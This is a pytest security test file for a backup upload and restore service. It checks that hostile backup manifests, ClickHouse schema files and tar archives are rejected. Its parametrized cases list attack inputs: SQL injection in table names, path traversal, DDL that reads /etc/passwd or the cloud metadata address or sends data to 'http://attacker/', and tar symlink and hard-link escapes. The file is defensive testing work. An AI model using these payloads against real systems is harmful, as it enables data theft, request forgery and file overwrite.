"""VAPT N3: an uploaded backup's manifest/schema/archive is not trusted.

Proves that a backup written by ``run_backup`` round-trips through download
-> upload -> restore validation unchanged, and that hostile table names,
ClickHouse backup names, schema statements and tar members are refused before
anything is written or executed.
"""
from __future__ import annotations

import asyncio
import io
import json
import re
import sqlite3
import tarfile
import uuid
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import AsyncMock

import pytest

from app.api.v1 import storage_management as api
from app.core import database
from app.services import storage_service as svc


REPO_ROOT = Path(__file__).resolve().parents[2]

# create_table_query as ClickHouse renders it in system.tables.
CH_TABLE_DDL = (
    "CREATE TABLE zenplus.ping_metrics\n(\n    `device_id` UUID,\n"
    "    `timestamp` DateTime64(3, 'UTC'),\n    `is_up` UInt8,\n"
    "    `rtt_ms` Float64\n)\nENGINE = MergeTree\nPARTITION BY toYYYYMM(timestamp)\n"
    "ORDER BY (device_id, timestamp)\nTTL toDateTime(timestamp) + toIntervalDay(30)\n"
    "SETTINGS index_granularity = 8192"
)
CH_ROLLUP_DDL = (
    "CREATE TABLE zenplus.ping_metrics_5m\n(\n    `device_id` UUID,\n"
    "    `timestamp` DateTime,\n    `avg_rtt_ms` AggregateFunction(avg, Float64)\n)\n"
    "ENGINE = AggregatingMergeTree\nORDER BY (device_id, timestamp)\n"
    "SETTINGS index_granularity = 8192"
)
CH_MV_DDL = (
    "CREATE MATERIALIZED VIEW zenplus.ping_metrics_5m_mv TO zenplus.ping_metrics_5m\n(\n"
    "    `device_id` UUID,\n    `timestamp` DateTime,\n"
    "    `avg_rtt_ms` AggregateFunction(avg, Float64)\n)\nAS SELECT\n    device_id,\n"
    "    toStartOfFiveMinutes(timestamp) AS timestamp,\n    avgState(rtt_ms) AS avg_rtt_ms\n"
    "FROM zenplus.ping_metrics\nGROUP BY\n    device_id,\n    timestamp"
)
CH_ROWS = [("ping_metrics", CH_TABLE_DDL), ("ping_metrics_5m", CH_ROLLUP_DDL)]
CH_MVS = [("ping_metrics_5m_mv", CH_MV_DDL)]


class FakeCH:
    def __init__(self, existing=()):
        self.commands: list[str] = []
        self.queries: list[str] = []
        self.existing = list(existing)

    def query(self, sql, parameters=None):
        self.queries.append(sql)
        if "engine != 'MaterializedView'" in sql:
            return SimpleNamespace(result_rows=CH_ROWS)
        if "engine = 'MaterializedView'" in sql:
            return SimpleNamespace(result_rows=CH_MVS)
        if sql.startswith("SELECT name FROM system.tables"):
            return SimpleNamespace(result_rows=[(t,) for t in self.existing])
        if sql.startswith("RESTORE TABLE"):
            return SimpleNamespace(result_rows=[])
        if sql.startswith("BACKUP DATABASE"):
            return SimpleNamespace(result_rows=[("op-1",)])
        raise AssertionError(sql)

    def command(self, sql):
        self.commands.append(sql)


class Session:
    def __init__(self, conn):
        self.conn = conn

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        return False

    async def execute(self, statement, params):
        sql = re.sub(r"NOW\(\)", "'now'", str(statement))
        self.conn.execute(sql, params)

    async def commit(self):
        self.conn.commit()


@pytest.fixture
def roots(tmp_path, monkeypatch):
    backup_root = tmp_path / "appliance"
    ch_root = tmp_path / "clickhouse"
    backup_root.mkdir()
    (ch_root / "appliance").mkdir(parents=True)
    monkeypatch.setattr(svc, "BACKUP_ROOT", str(backup_root))
    monkeypatch.setattr(svc, "CH_BACKUP_HOST_ROOT", str(ch_root))
    return backup_root, ch_root


def _db(tmp_path):
    conn = sqlite3.connect(tmp_path / "state.db", check_same_thread=False)
    conn.execute(
        "CREATE TABLE storage_backups(id TEXT PRIMARY KEY, status TEXT, size_bytes INT, "
        "path TEXT, finished_at TEXT, error TEXT, last_restore_status TEXT, "
        "last_restore_error TEXT)"
    )
    return conn


def _make_appliance_backup(tmp_path, monkeypatch, backup_root, ch_root, fake):
    """Run the real backup writer with its external steps faked."""
    backup_id = str(uuid.uuid4())
    conn = _db(tmp_path)
    conn.execute("INSERT INTO storage_backups(id, status) VALUES (?, 'running')", (backup_id,))
    conn.commit()

    def helper(cmd, path, *rest):
        assert cmd == "pg-dump"
        Path(path).write_bytes(b"PGDMP-fixture")
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    def config_tar(dest):
        with tarfile.open(dest, "w:gz") as tar:
            data = b"POSTGRES_PASSWORD=fixture\n"
            info = tarfile.TarInfo("opt/zenplus/.env")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
        return ["/opt/zenplus/.env"]

    def ch_backup_start(bid):
        snap = ch_root / "appliance" / bid
        (snap / "data" / "zenplus" / "ping_metrics").mkdir(parents=True)
        (snap / ".backup").write_text("<config/>")
        (snap / "data" / "zenplus" / "ping_metrics" / "all_1_1_0.bin").write_bytes(b"x" * 16)
        return "op-1"

    monkeypatch.setattr(svc, "get_ch_client", lambda: fake)
    monkeypatch.setattr(svc, "_run_helper", helper)
    monkeypatch.setattr(svc, "_write_config_tar", config_tar)
    monkeypatch.setattr(svc, "_ch_backup_start_sync", ch_backup_start)
    monkeypatch.setattr(svc, "_wait_ch_operation", AsyncMock())
    monkeypatch.setattr(svc, "ch_inventory", AsyncMock(return_value=[{"size_bytes": 1}]))
    monkeypatch.setattr(svc, "_mount_usage", lambda path: {"free_bytes": 10**12})
    monkeypatch.setattr(svc, "write_storage_event", AsyncMock())
    monkeypatch.setattr(database, "AsyncSessionLocal", lambda: Session(conn))
    asyncio.run(svc.run_backup(backup_id, "full", True, "admin"))
    assert conn.execute("SELECT status FROM storage_backups").fetchone()[0] == "completed"
    return backup_id, conn


def _download_archive(dest, backup_root, ch_root, backup_id):
    """Mirror download_backup: tar -C root <id> plus clickhouse-<id> transform."""
    with tarfile.open(dest, "w:gz") as tar:
        tar.add(str(backup_root / backup_id), arcname=backup_id)
        ch_dir = ch_root / "appliance" / backup_id
        if ch_dir.is_dir():
            tar.add(str(ch_dir), arcname=f"clickhouse-{backup_id}")


def _archive(path, entries):
    """entries: list of (TarInfo kwargs, bytes|None)."""
    with tarfile.open(path, "w:gz") as tar:
        for spec, data in entries:
            info = tarfile.TarInfo(spec["name"])
            for key, value in spec.items():
                setattr(info, key, value)
            if data is not None:
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
            else:
                tar.addfile(info)


def _manifest(backup_id, **overrides):
    mf = {
        "id": backup_id, "kind": "full", "include_clickhouse": True,
        "clickhouse_backup_name": f"appliance/{backup_id}",
        "clickhouse_tables": ["ping_metrics", "ping_metrics_5m", "ping_metrics_5m_mv"],
    }
    mf.update(overrides)
    return json.dumps(mf).encode()


def _schema():
    return ("\n\n".join(d + ";" for _n, d in CH_ROWS + CH_MVS) + "\n").encode()


# ─── Appliance-written backups keep working ─────────────────────────────────

def test_appliance_backup_round_trips_through_upload_and_restore(tmp_path, monkeypatch, roots):
    backup_root, ch_root = roots
    fake = FakeCH()
    backup_id, conn = _make_appliance_backup(tmp_path, monkeypatch, backup_root, ch_root, fake)
    manifest = json.loads((backup_root / backup_id / "manifest.json").read_text())
    assert manifest["clickhouse_backup_name"] == f"appliance/{backup_id}"
    assert manifest["clickhouse_tables"] == ["ping_metrics", "ping_metrics_5m", "ping_metrics_5m_mv"]

    archive = tmp_path / "download.tar.gz"
    _download_archive(archive, backup_root, ch_root, backup_id)

    # Import it on a "fresh" appliance.
    other_root, other_ch = tmp_path / "other", tmp_path / "other-ch"
    other_root.mkdir()
    (other_ch / "appliance").mkdir(parents=True)
    monkeypatch.setattr(svc, "BACKUP_ROOT", str(other_root))
    monkeypatch.setattr(svc, "CH_BACKUP_HOST_ROOT", str(other_ch))
    mf = api._extract_uploaded_backup(str(archive))
    assert mf["id"] == backup_id
    assert (other_root / backup_id / "postgres.dump").read_bytes() == b"PGDMP-fixture"
    assert (other_ch / "appliance" / backup_id / "data" / "zenplus" / "ping_metrics"
            / "all_1_1_0.bin").is_file()

    # Restore preflight + table allow-list + schema application all accept it.
    components = ["clickhouse_schema", "clickhouse_data"]
    restored = svc.preflight_restore(backup_id, components)
    schema_sql = svc._read_backup_schema(str(other_root / backup_id))
    assert svc._restorable_tables(restored, schema_sql) == manifest["clickhouse_tables"]
    fresh = FakeCH()
    monkeypatch.setattr(svc, "get_ch_client", lambda: fresh)
    assert svc._ch_apply_schema_sync(schema_sql) == 3
    assert [c.split("\n")[0] for c in fresh.commands] == [
        "CREATE TABLE IF NOT EXISTS zenplus.ping_metrics",
        "CREATE TABLE IF NOT EXISTS zenplus.ping_metrics_5m",
        "CREATE MATERIALIZED VIEW IF NOT EXISTS zenplus.ping_metrics_5m_mv TO zenplus.ping_metrics_5m",
    ]
    svc._ch_restore_table_sync("ping_metrics", f"appliance/{backup_id}")
    assert fresh.commands[-1] == "DROP TABLE IF EXISTS zenplus.ping_metrics SYNC"


def test_full_restore_of_appliance_backup_completes(tmp_path, monkeypatch, roots):
    backup_root, ch_root = roots
    fake = FakeCH()
    backup_id, conn = _make_appliance_backup(tmp_path, monkeypatch, backup_root, ch_root, fake)
    monkeypatch.setattr(svc, "_run_helper", lambda *a: SimpleNamespace(returncode=0, stdout="", stderr=""))
    fresh = FakeCH()
    monkeypatch.setattr(svc, "get_ch_client", lambda: fresh)
    asyncio.run(svc.run_restore(backup_id, ["postgres", "clickhouse_schema", "clickhouse_data"], "admin"))
    status, err = conn.execute("SELECT last_restore_status, last_restore_error FROM storage_backups").fetchone()
    assert (status, err) == ("completed", None)
    assert sum(1 for c in fresh.commands if c.startswith("DROP TABLE")) == 3


def test_repository_clickhouse_schema_statements_are_accepted():
    """Every CREATE statement the appliance ships validates."""
    count = 0
    for path in sorted((REPO_ROOT / "scripts").glob("*clickhouse*.sql")):
        text = re.sub(r"--[^\n]*", "", path.read_text(encoding="utf-8"))
        for stmt in text.split(";"):
            stmt = stmt.strip()
            if re.match(r"(?i)^CREATE\s+(TABLE|MATERIALIZED\s+VIEW|VIEW|DICTIONARY)\b", stmt) \
                    and "zenplus." in stmt.split("(", 1)[0]:
                svc.validate_clickhouse_schema(stmt + ";\n")
                count += 1
    assert count > 50


def test_inner_materialized_view_tables_are_skipped_not_run():
    sql = (CH_TABLE_DDL + ";\n\n"
           "CREATE TABLE zenplus.`.inner_id.5f3a6a5e-1111-2222-3333-444455556666`\n"
           "(\n    `a` UInt8\n)\nENGINE = MergeTree\nORDER BY a;\n")
    names = [n for _k, n, _s in svc.validate_clickhouse_schema(sql)]
    assert names == ["ping_metrics"]


# ─── Hostile manifests ──────────────────────────────────────────────────────

BID = "0f8fad5b-d9cb-469f-a165-70867728950e"


@pytest.mark.parametrize("tables", [
    ["ping_metrics; DROP DATABASE zenplus"],
    ["zenplus.devices"],
    ["`x`"],
    ["a" * 129],
    ["1abc"],
    [""],
    [{"name": "x"}],
    "ping_metrics",
])
def test_invalid_table_names_are_refused(tables):
    with pytest.raises(svc.BackupValidationError):
        svc.validate_backup_manifest({"id": BID, "clickhouse_tables": tables}, BID)


@pytest.mark.parametrize("name", [
    "appliance/x') ; DROP TABLE zenplus.devices --",
    "appliance/../../etc",
    f"appliance/{BID.upper()}",
    "appliance/11111111-2222-3333-4444-555555555555",  # another backup
    f"other/{BID}",
    123,
])
def test_invalid_clickhouse_backup_names_are_refused(name):
    with pytest.raises(svc.BackupValidationError):
        svc.validate_backup_manifest({"id": BID, "clickhouse_backup_name": name}, BID)


def test_manifest_id_must_match_and_be_canonical():
    with pytest.raises(svc.BackupValidationError):
        svc.validate_backup_manifest({"id": "11111111-2222-3333-4444-555555555555"}, BID)
    for bad in (f"urn:uuid:{BID}", BID.upper(), BID.replace("-", ""), "{%s}" % BID, None):
        with pytest.raises(svc.BackupValidationError):
            svc.validate_uploaded_backup_id(bad)
    assert svc.validate_uploaded_backup_id(BID) == BID


def test_unknown_tables_are_refused_even_with_valid_identifiers(monkeypatch):
    fake = FakeCH(existing=["devices_live"])
    monkeypatch.setattr(svc, "get_ch_client", lambda: fake)
    mf = {"clickhouse_tables": ["ping_metrics", "devices_live"]}
    assert svc._restorable_tables(mf, CH_TABLE_DDL + ";\n") == ["ping_metrics", "devices_live"]
    with pytest.raises(svc.BackupValidationError, match="neither in the backup schema"):
        svc._restorable_tables({"clickhouse_tables": ["users"]}, CH_TABLE_DDL + ";\n")


def test_restore_table_sync_refuses_unvalidated_input(monkeypatch):
    fake = FakeCH()
    monkeypatch.setattr(svc, "get_ch_client", lambda: fake)
    for table, name in (("x; DROP", f"appliance/{BID}"), ("ok", "appliance/x')")):
        with pytest.raises(svc.BackupValidationError):
            svc._ch_restore_table_sync(table, name)
    assert fake.commands == []


# ─── Hostile schema ─────────────────────────────────────────────────────────

@pytest.mark.parametrize("stmt", [
    "DROP TABLE zenplus.devices",
    "SYSTEM SHUTDOWN",
    "INSERT INTO zenplus.ping_metrics SELECT * FROM zenplus.ping_metrics",
    "ATTACH TABLE zenplus.x FROM '/etc' (a String) ENGINE = MergeTree ORDER BY a",
    "CREATE OR REPLACE TABLE zenplus.x (a UInt8) ENGINE = MergeTree ORDER BY a",
    "CREATE TABLE default.x (a UInt8) ENGINE = MergeTree ORDER BY a",
    "CREATE TABLE zenplus_other.x (a UInt8) ENGINE = MergeTree ORDER BY a",
    "CREATE USER evil IDENTIFIED BY 'x'",
    "CREATE TABLE zenplus.x (a String) ENGINE = URL('http://attacker/', CSV)",
    "CREATE TABLE zenplus.x (a String) ENGINE = File(TSV)",
    "CREATE TABLE zenplus.x (a String) ENGINE = MySQL('h:3306', 'db', 't', 'u', 'p')",
    "CREATE TABLE zenplus.x (a String) ENGINE = MergeTree ORDER BY a AS SELECT * FROM file('/etc/passwd', 'LineAsString')",
    "CREATE TABLE zenplus.x ENGINE = MergeTree ORDER BY a AS SELECT * FROM url('http://169.254.169.254/', 'RawBLOB')",
    "CREATE TABLE zenplus.x (a String) ENGINE = MergeTree ORDER BY a SETTINGS disk = disk(type = web, endpoint = 'http://attacker/')",
    "CREATE TABLE zenplus.x (a String) ENGINE = MergeTree ORDER BY a; DROP TABLE zenplus.devices",
    "CREATE TABLE zenplus.x (a String) ENGINE = MergeTree ORDER BY a AS SELECT name FROM system.users",
    "CREATE TABLE zenplus.x AS remote('10.0.0.1', zenplus.ping_metrics)",
    "CREATE TABLE zenplus.x (a UInt8)",
    "CREATE MATERIALIZED VIEW zenplus.v TO default.sink AS SELECT 1 AS a FROM zenplus.ping_metrics",
    "CREATE MATERIALIZED VIEW zenplus.v TO zenplus.t AS SELECT * FROM s3('https://bucket/x', 'CSV')",
    "CREATE VIEW zenplus.v AS SELECT * FROM postgresql('db:5432', 'zenplus', 'users', 'u', 'p')",
    "CREATE VIEW zenplus.v AS SELECT * FROM executable('id', 'TSV', 'a String')",
    "CREATE DICTIONARY zenplus.d (id UInt64, v String) PRIMARY KEY id "
    "SOURCE(HTTP(url 'http://attacker/' format 'TSV')) LAYOUT(FLAT()) LIFETIME(0)",
    "CREATE DICTIONARY zenplus.d (id UInt64, v String) PRIMARY KEY id "
    "SOURCE(CLICKHOUSE(HOST '10.0.0.9' PORT 9000 TABLE 't')) LAYOUT(FLAT()) LIFETIME(0)",
    "CREATE TABLE zenplus.`bad name` (a UInt8) ENGINE = MergeTree ORDER BY a",
])
def test_hostile_schema_statements_are_refused(stmt, monkeypatch):
    sql = CH_TABLE_DDL + ";\n\n" + stmt + ";\n"
    with pytest.raises(svc.BackupValidationError):
        svc.validate_clickhouse_schema(sql)
    fake = FakeCH()
    monkeypatch.setattr(svc, "get_ch_client", lambda: fake)
    with pytest.raises(svc.BackupValidationError):
        svc._ch_apply_schema_sync(sql)
    assert fake.commands == []  # nothing runs, not even the valid first statement


def test_local_dictionaries_and_views_are_accepted():
    sql = (
        "CREATE VIEW zenplus.v AS SELECT device_id FROM zenplus.ping_metrics;\n\n"
        "CREATE DICTIONARY zenplus.d (id UInt64, v String) PRIMARY KEY id "
        "SOURCE(CLICKHOUSE(TABLE 'ping_metrics' DB 'zenplus')) LAYOUT(FLAT()) LIFETIME(0);\n"
    )
    assert [(k, n) for k, n, _ in svc.validate_clickhouse_schema(sql)] == [
        ("VIEW", "v"), ("DICTIONARY", "d")]


def test_run_restore_refuses_hostile_manifest_before_touching_anything(tmp_path, monkeypatch, roots):
    backup_root, _ch = roots
    bdir = backup_root / BID
    bdir.mkdir()
    (bdir / "manifest.json").write_bytes(_manifest(BID, clickhouse_tables=["x;DROP DATABASE zenplus"]))
    (bdir / "clickhouse_schema.sql").write_bytes(_schema())
    (bdir / "postgres.dump").write_bytes(b"fixture")
    conn = _db(tmp_path)
    conn.execute("INSERT INTO storage_backups(id, status) VALUES (?, 'completed')", (BID,))
    conn.commit()
    helper_calls = []
    monkeypatch.setattr(svc, "_run_helper", lambda *a: helper_calls.append(a))
    fake = FakeCH()
    monkeypatch.setattr(svc, "get_ch_client", lambda: fake)
    monkeypatch.setattr(svc, "write_storage_event", AsyncMock())
    monkeypatch.setattr(database, "AsyncSessionLocal", lambda: Session(conn))
    asyncio.run(svc.run_restore(BID, ["postgres", "clickhouse_data"], "admin"))
    status, err = conn.execute("SELECT last_restore_status, last_restore_error FROM storage_backups").fetchone()
    assert status == "failed" and "invalid ClickHouse table name" in err
    assert helper_calls == [] and fake.commands == []


def test_preflight_refuses_hostile_schema(roots):
    backup_root, _ch = roots
    bdir = backup_root / BID
    bdir.mkdir()
    (bdir / "manifest.json").write_bytes(_manifest(BID))
    (bdir / "clickhouse_schema.sql").write_text("DROP DATABASE zenplus;\n")
    with pytest.raises(svc.BackupValidationError):
        svc.preflight_restore(BID, ["clickhouse_schema"])
    # A config-only restore does not depend on the schema.
    assert svc.preflight_restore(BID, ["config"])["id"] == BID


# ─── Hostile archives ───────────────────────────────────────────────────────

def _base_entries(backup_id=BID, manifest=None):
    return [
        ({"name": backup_id, "type": tarfile.DIRTYPE, "mode": 0o755}, None),
        ({"name": f"{backup_id}/manifest.json"}, manifest or _manifest(backup_id)),
        ({"name": f"{backup_id}/clickhouse_schema.sql"}, _schema()),
        ({"name": f"{backup_id}/postgres.dump"}, b"PGDMP"),
    ]


@pytest.mark.parametrize("extra", [
    ({"name": f"{BID}/evil", "type": tarfile.SYMTYPE, "linkname": "/opt/zenplus"}, None),
    ({"name": f"{BID}/rel", "type": tarfile.SYMTYPE, "linkname": "postgres.dump"}, None),
    ({"name": f"{BID}/hl", "type": tarfile.LNKTYPE, "linkname": "/etc/passwd"}, None),
    ({"name": f"{BID}/hl", "type": tarfile.LNKTYPE, "linkname": "other/postgres.dump"}, None),
    ({"name": f"{BID}/dev", "type": tarfile.CHRTYPE, "devmajor": 1, "devminor": 3}, None),
    ({"name": f"{BID}/fifo", "type": tarfile.FIFOTYPE}, None),
    ({"name": f"clickhouse-{BID}/link", "type": tarfile.SYMTYPE, "linkname": "/var/lib"}, None),
    ({"name": f"{BID}/../escape"}, b"x"),
])
def test_hostile_archive_members_are_refused_before_extraction(tmp_path, roots, extra):
    backup_root, ch_root = roots
    archive = tmp_path / "evil.tar.gz"
    _archive(archive, _base_entries() + [extra])
    with pytest.raises(ValueError):
        api._extract_uploaded_backup(str(archive))
    assert list(backup_root.iterdir()) == []
    assert list((ch_root / "appliance").iterdir()) == []


@pytest.mark.parametrize("entries", [
    # manifest is a symlink to another member
    [({"name": BID, "type": tarfile.DIRTYPE}, None),
     ({"name": f"{BID}/manifest.json", "type": tarfile.SYMTYPE, "linkname": "x"}, None)],
    # manifest id does not match its directory
    [({"name": f"{BID}/manifest.json"}, _manifest("11111111-2222-3333-4444-555555555555"))],
    # non-canonical id
    [({"name": f"{BID.upper()}/manifest.json"}, _manifest(BID.upper()))],
    # hostile table list in manifest
    [({"name": f"{BID}/manifest.json"}, _manifest(BID, clickhouse_tables=["a b"]))],
    # hostile schema file
    [({"name": f"{BID}/manifest.json"}, _manifest(BID)),
     ({"name": f"{BID}/clickhouse_schema.sql"}, b"DROP DATABASE zenplus;\n")],
])
def test_hostile_manifest_or_schema_is_refused_at_upload(tmp_path, roots, entries):
    backup_root, _ch = roots
    archive = tmp_path / "evil.tar.gz"
    _archive(archive, entries)
    with pytest.raises(ValueError):
        api._extract_uploaded_backup(str(archive))
    assert list(backup_root.iterdir()) == []


def test_internal_hard_links_still_extract(tmp_path, roots):
    backup_root, ch_root = roots
    archive = tmp_path / "ok.tar.gz"
    _archive(archive, _base_entries() + [
        ({"name": f"clickhouse-{BID}", "type": tarfile.DIRTYPE, "mode": 0o755}, None),
        ({"name": f"clickhouse-{BID}/a.bin"}, b"abc"),
        ({"name": f"clickhouse-{BID}/b.bin", "type": tarfile.LNKTYPE,
          "linkname": f"clickhouse-{BID}/a.bin"}, None),
    ])
    api._extract_uploaded_backup(str(archive))
    assert (ch_root / "appliance" / BID / "b.bin").read_bytes() == b"abc"
    assert (backup_root / BID / "postgres.dump").read_bytes() == b"PGDMP"


def test_extraction_without_tarfile_filters_still_refuses_links(tmp_path, roots, monkeypatch):
    backup_root, _ch = roots
    monkeypatch.delattr(tarfile, "data_filter", raising=False)
    ok = tmp_path / "ok.tar.gz"
    _archive(ok, _base_entries())
    api._extract_uploaded_backup(str(ok))
    assert (backup_root / BID / "manifest.json").is_file()
    bad = tmp_path / "bad.tar.gz"
    other = "6fa459ea-ee8a-3ca4-894e-db77e160355e"
    _archive(bad, _base_entries(other) + [
        ({"name": f"{other}/x", "type": tarfile.SYMTYPE, "linkname": "/etc"}, None)])
    with pytest.raises(ValueError):
        api._extract_uploaded_backup(str(bad))
    assert not (backup_root / other).exists()
